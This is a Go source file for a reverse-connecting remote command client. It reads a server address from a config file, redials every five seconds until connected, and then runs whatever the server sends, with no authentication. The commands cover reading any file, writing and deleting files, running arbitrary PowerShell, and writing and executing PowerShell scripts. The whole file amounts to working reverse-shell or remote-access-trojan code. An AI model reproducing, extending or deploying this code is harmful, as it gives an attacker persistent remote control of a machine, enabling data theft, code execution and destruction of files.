package main

import (
	"bytes"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"
)

var addr string = "localhost:8888"

func main() {
	var conn net.Conn

	config := readConfig("client.cfg")
	for _, kv := range config {
		key, value := kv[0], kv[1]
		switch key {
		case "addr":
			addr = value
		}
	}

	for {
		conn = nil
		for conn == nil {
			conn = dialServer(addr)
			if conn == nil {
				time.Sleep(5 * time.Second)
			}
		}
		fmt.Printf("Host: %v\n", conn.LocalAddr().String())
		handleServer(conn)
	}
}

func dialServer(addr string) (conn net.Conn) {
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		fmt.Printf("Dail error: %v\n", err)
		return nil
	}

	return conn
}

func handleServer(conn net.Conn) {
	var buf []byte

	for {
		buf = make([]byte, 1024)
		_, err := conn.Read(buf)
		if err != nil {
			fmt.Printf("Read error: %v\n", err)
			break
		}
		buf = bytes.Trim(buf, "\x00")
		conn.Write([]byte(runCommand(string(buf))))
	}
}

func runCommand(cmd string) (output string) {
	cleanCmd := strings.TrimSpace(cmd)
	operation, args, _ := strings.Cut(cleanCmd, " ")

	fmt.Printf("%v [%v]\n", operation, args)

	switch operation {
	case "pwd":
		dir, err := os.Getwd()
		if err != nil {
			return err.Error()
		}
		return dir

	case "ls":
		fileList := ""
		files, err := os.ReadDir(".")
		if err != nil {
			return err.Error()
		}
		for _, file := range files {
			fileInfo, err := os.Lstat(file.Name())
			if err != nil {
				return err.Error()
			}
			fileList += fmt.Sprintf("%-32v", file.Name())
			if file.IsDir() == false {
				fileList += fmt.Sprintf("%v bytes", fileInfo.Size())
			}
			fileList += "\n"
		}
		if fileList == "" {
			return "Directory is empty."
		}
		return fileList

	case "cd":
		err := os.Chdir(args)
		if err != nil {
			return err.Error()
		}
		return fmt.Sprintf("Directory changed to %v", runCommand("pwd"))

	case "cat":
		content, err := os.ReadFile(args)
		if err != nil {
			return err.Error()
		}
		if string(content) == "" {
			return "File is empty."
		}
		return string(content)

	case "ps":
		stdout, err := exec.Command("powershell.exe", args).Output()
		if err != nil {
			return err.Error()
		}
		if string(stdout) == "" {
			return fmt.Sprintf("Executed powershell.exe %v successfully.", args)
		}
		return string(stdout)

	case "touch":
		file, err := os.Create(args)
		if err != nil {
			return err.Error()
		}

		err = file.Close()
		if err != nil {
			return err.Error()
		}
		
		return fmt.Sprintf("Created %v successfully.", args)

	case "write":
		filename, content, found := strings.Cut(args, " ")
		if found != true {
			return "Invalid syntax."
		}

		file, err := os.Create(filename)
		if err != nil {
			return err.Error()
		}

		_, err = file.WriteString(content)
		if err != nil {
			return err.Error()
		}

		err = file.Close()
		if err != nil {
			return err.Error()
		}

		return fmt.Sprintf("Written to %v successfully.", filename)

	case "display":
		filename, content, found := strings.Cut(args, " ")
		if found != true {
			return "Invalid syntax."
		}

		file, err := os.Create(filename)
		if err != nil {
			return err.Error()
		}

		_, err = file.WriteString(content)
		if err != nil {
			return err.Error()
		}

		err = file.Close()
		if err != nil {
			return err.Error()
		}

		stdout, err := exec.Command("powershell.exe", ".\\"+filename).Output()
		if err != nil {
			return err.Error()
		}

		return fmt.Sprintf("Displayed %s from %v successfully.", stdout, filename)

	case "remove":
		err := os.Remove(args)
		if err != nil {
			return err.Error()
		}
		return fmt.Sprintf("Removed %v successfully", args)

	default:
		return fmt.Sprintf("%v is not a valid command\n", cleanCmd)
	}
}

func readConfig(name string) (config [][]string) {
	data, err := os.ReadFile(name)
	if err != nil {
		log.Fatalf("read error: %v\n", err)
	}

	lines := strings.Split(strings.ReplaceAll(string(data), "\r", ""), "\n")

	for _, line := range lines {
		keyValuePair := strings.Split(line, "=")
		if len(keyValuePair) == 2 {
			config = append(config, keyValuePair)
		}
	}

	return config
}
